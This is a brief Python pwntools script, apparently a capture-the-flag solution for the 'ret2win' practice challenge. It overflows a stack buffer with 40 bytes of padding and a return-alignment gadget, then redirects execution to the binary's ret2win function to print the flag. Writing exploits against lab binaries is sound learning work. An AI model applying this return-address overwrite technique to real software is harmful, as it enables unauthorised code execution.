#!/usr/bin/env python3

###
## authored by brvsh
## https://brv.sh/
###

from pwn import *

elf = context.binary = ELF("./ret2win", checksec=False)
proc = process()

payload = flat([
    b"A" * 40,              # padding
    p64(0x40053e),          # ret (alignment)
    p64(elf.sym["ret2win"]) # ret2win
])

proc.sendlineafter(b"\n> ", payload)
info("brvsh> payload sent!")
proc.recvuntil(b"your flag:\n")
info(f"brvsh> FLAG! {proc.recvline().decode()}")
proc.close()
